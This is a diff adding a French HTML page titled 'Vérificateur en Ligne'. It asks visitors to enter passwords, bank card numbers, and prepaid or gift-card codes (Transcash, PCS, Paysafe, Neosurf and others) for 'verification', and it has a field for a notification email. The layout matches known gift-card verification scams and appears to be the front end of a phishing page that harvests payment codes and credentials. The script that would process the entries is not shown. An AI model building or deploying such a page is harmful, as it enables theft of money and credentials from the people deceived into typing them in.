@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérificateur en Ligne</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1><i class="fas fa-shield-alt"></i> Vérificateur en Ligne</h1>
+            <p>Vérifiez vos informations et cartes en temps réel</p>
+            
+            <!-- Configuration Email -->
+            <div class="email-config">
+                <div class="email-input-group">
+                    <label for="notification-email">
+                        <i class="fas fa-envelope"></i> Email pour notifications :
+                    </label>
+                    <input type="email" id="notification-email" placeholder="votre@email.com">
+                    <button class="save-email-btn" onclick="saveEmailConfig()">
+                        <i class="fas fa-save"></i> Sauvegarder
+                    </button>
+                </div>
+                <div class="email-status" id="email-status"></div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="verification-tabs">
+                <button class="tab-btn active" data-tab="email">
+                    <i class="fas fa-envelope"></i> Email
+                </button>
+                <button class="tab-btn" data-tab="phone">
+                    <i class="fas fa-phone"></i> Téléphone
+                </button>
+                <button class="tab-btn" data-tab="password">
+                    <i class="fas fa-lock"></i> Mot de passe
+                </button>
+                <button class="tab-btn" data-tab="url">
+                    <i class="fas fa-link"></i> URL
+                </button>
+                <button class="tab-btn" data-tab="credit-card">
+                    <i class="fas fa-credit-card"></i> Carte bancaire
+                </button>
+                <button class="tab-btn" data-tab="gift-cards">
+                    <i class="fas fa-gift"></i> Cartes cadeaux
+                </button>
+                <button class="tab-btn" data-tab="codes">
+                    <i class="fas fa-barcode"></i> Codes
+                </button>
+            </div>
+
+            <div class="verification-content">
+                <!-- Email Verification -->
+                <div class="tab-content active" id="email-tab">
+                    <h2>Vérification d'Email</h2>
+                    <div class="input-group">
+                        <input type="email" id="email-input" placeholder="Entrez votre adresse email">
+                        <button class="verify-btn" onclick="verifyEmail()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="result" id="email-result"></div>
+                </div>
+
+                <!-- Phone Verification -->
+                <div class="tab-content" id="phone-tab">
+                    <h2>Vérification de Téléphone</h2>
+                    <div class="input-group">
+                        <input type="tel" id="phone-input" placeholder="Entrez votre numéro de téléphone">
+                        <button class="verify-btn" onclick="verifyPhone()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="result" id="phone-result"></div>
+                </div>
+
+                <!-- Password Verification -->
+                <div class="tab-content" id="password-tab">
+                    <h2>Vérification de Mot de Passe</h2>
+                    <div class="input-group">
+                        <input type="password" id="password-input" placeholder="Entrez votre mot de passe">
+                        <button class="verify-btn" onclick="verifyPassword()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="password-strength" id="password-strength">
+                        <div class="strength-bar">
+                            <div class="strength-fill" id="strength-fill"></div>
+                        </div>
+                        <div class="strength-text" id="strength-text">Force du mot de passe</div>
+                    </div>
+                    <div class="result" id="password-result"></div>
+                </div>
+
+                <!-- URL Verification -->
+                <div class="tab-content" id="url-tab">
+                    <h2>Vérification d'URL</h2>
+                    <div class="input-group">
+                        <input type="url" id="url-input" placeholder="Entrez l'URL à vérifier">
+                        <button class="verify-btn" onclick="verifyUrl()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="result" id="url-result"></div>
+                </div>
+
+                <!-- Credit Card Verification -->
+                <div class="tab-content" id="credit-card-tab">
+                    <h2>Vérification de Carte Bancaire</h2>
+                    <div class="input-group">
+                        <input type="text" id="card-input" placeholder="Entrez le numéro de carte" maxlength="19">
+                        <button class="verify-btn" onclick="verifyCard()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="result" id="card-result"></div>
+                </div>
+
+                <!-- Gift Cards Verification -->
+                <div class="tab-content" id="gift-cards-tab">
+                    <h2>Vérification de Cartes Cadeaux</h2>
+                    <div class="card-type-selector">
+                        <label for="card-type">Type de carte :</label>
+                        <select id="card-type">
+                            <option value="transcash">Transcash</option>
+                            <option value="google-play">Google Play</option>
+                            <option value="steam">Steam Card</option>
+                            <option value="paysafe">Paysafe Card</option>
+                            <option value="pcs">PCS</option>
+                            <option value="itunes">iTunes</option>
+                            <option value="neosurf">Néosurf</option>
+                            <option value="amazon">Amazon</option>
+                            <option value="netflix">Netflix</option>
+                            <option value="spotify">Spotify</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="gift-card-input" placeholder="Entrez le code de la carte cadeau">
+                        <div class="hide-code-toggle">
+                            <label>
+                                <input type="checkbox" id="hide-code-toggle">
+                                Cacher le code ?
+                            </label>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <button class="verify-btn" onclick="verifyGiftCard()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="result" id="gift-card-result"></div>
+                </div>
+
+                <!-- Codes Verification -->
+                <div class="tab-content" id="codes-tab">
+                    <h2>Vérification de Codes</h2>
+                    <div class="code-type-selector">
+                        <label for="code-type">Type de code :</label>
+                        <select id="code-type">
+                            <option value="promo">Code promo</option>
+                            <option value="coupon">Coupon</option>
+                            <option value="serial">Numéro de série</option>
+                            <option value="activation">Code d'activation</option>
+                            <option value="license">Clé de licence</option>
+                            <option value="voucher">Bon d'achat</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="code-input" placeholder="Entrez le code à vérifier">
+                        <div class="hide-code-toggle">
+                            <label>
+                                <input type="checkbox" id="hide-code-toggle-2">
+                                Cacher le code ?
+                            </label>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <button class="verify-btn" onclick="verifyCode()">
+                            <i class="fas fa-check"></i> Vérifier
+                        </button>
+                    </div>
+                    <div class="result" id="code-result"></div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <p>&copy; 2024 Vérificateur en Ligne. Tous droits réservés.</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html> 
